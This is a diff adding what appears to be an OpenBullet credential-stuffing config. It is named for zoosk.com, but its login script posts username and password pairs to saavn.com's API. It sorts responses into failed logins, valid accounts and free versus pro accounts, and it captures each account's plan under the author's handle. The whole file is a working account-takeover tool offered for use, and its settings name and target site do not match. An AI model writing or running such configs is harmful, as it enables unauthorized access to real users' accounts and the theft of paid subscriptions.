@@ -1,0 +1,46 @@
+[SETTINGS]
+{
+  "Name": "zoosk.com",
+  "SuggestedBots": 1,
+  "LastModified": "2019-07-08T18:38:15.726356+05:30",
+  "AdditionalInfo": "",
+  "Author": "xXGunpointXx",
+  "Version": "1.0.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOGIN REQUEST POST "https://www.saavn.com/api.php?__call=user.login&_marker=0" 
+  CONTENT "username=<USER>&password=<PASS>&&ct=841887719" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "referer: https://www.saavn.com/login.php?action=login" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect username/password. Please try again." 
+    KEY "Only a valid email address, or letters, numbers, . and _ are allowed. Usernames must be atleast 6 characters long and no more than 24." 
+  KEYCHAIN Success OR 
+    KEY "uid='" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain "type='pro' " 
+
+PARSE "<SOURCE>" LR "type='" "'" -> CAP "Plan" "" "  || xXGunpointXx" 
+
